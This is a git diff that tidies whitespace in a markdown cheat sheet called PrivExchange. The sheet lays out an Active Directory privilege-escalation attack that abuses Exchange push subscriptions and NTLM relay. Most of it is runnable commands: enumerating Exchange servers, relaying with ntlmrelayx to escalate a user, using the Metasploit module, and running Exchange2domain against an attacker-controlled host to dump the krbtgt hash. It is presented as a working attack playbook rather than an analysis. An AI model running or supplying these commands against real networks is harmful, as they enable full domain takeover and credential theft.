@@ -1,22 +1,19 @@
 # PrivExchange
 
-Exchange your privileges for Domain Admin privs by abusing Exchange.    
+Exchange your privileges for Domain Admin privs by abusing Exchange.
 :warning: You need a shell on a user account with a mailbox.
-
 
 1. Exchange server hostname or IP address
 
-    ```bash 
+    ```bash
     pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
     ```
-
 
 2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).
 
     ```powershell
     ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
     ```
-
 
 3. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.
 
@@ -42,7 +39,7 @@ Exchange your privileges for Domain Admin privs by abusing Exchange.
     python aclpwn.py --restore ../aclpwn-20190319-125741.restore
     ```
 
-Alternatively you can use the Metasploit module 
+Alternatively you can use the Metasploit module
 
 [`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)
 
@@ -53,7 +50,6 @@ git clone github.com/Ridter/Exchange2domain
 python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
-
 
 ## References
 
